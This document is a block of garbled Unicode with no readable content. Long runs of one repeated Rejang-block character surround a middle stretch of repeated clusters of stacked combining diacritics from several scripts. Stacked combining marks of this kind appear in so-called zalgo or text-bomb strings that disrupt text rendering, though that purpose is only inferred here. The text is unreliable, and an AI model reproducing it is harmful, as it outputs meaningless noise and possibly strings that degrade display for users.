ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ